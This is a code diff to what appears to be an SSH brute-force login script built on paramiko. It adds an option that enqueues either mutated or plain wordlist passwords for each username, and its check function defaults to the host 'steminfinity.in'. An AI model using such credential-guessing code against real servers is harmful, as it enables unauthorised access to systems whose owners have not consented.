@@ -21,7 +21,7 @@ args = parser.parse_args()
 host = args.target
 user = args.user
 passwd = args.passwd
-
+mutant = args.mutate
 
 def check_ssh(ip="steminfinity.in", port=22, timeout=3):
     try:
@@ -97,10 +97,20 @@ client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 '''
 
 
-for userc in users:
-    for base in passwords:
-        for password in smart_mutate(base):
-            combo_queue.put((userc, password))
+
+if mutant:
+    for userc in users:
+        for base in passwords:
+            for password in smart_mutate(base):
+                combo_queue.put((userc, password))
+else:
+    for userc in users:
+        for password in passwords:
+            combo_queue.put((userc,password))
+
+
+
+
 
 
 
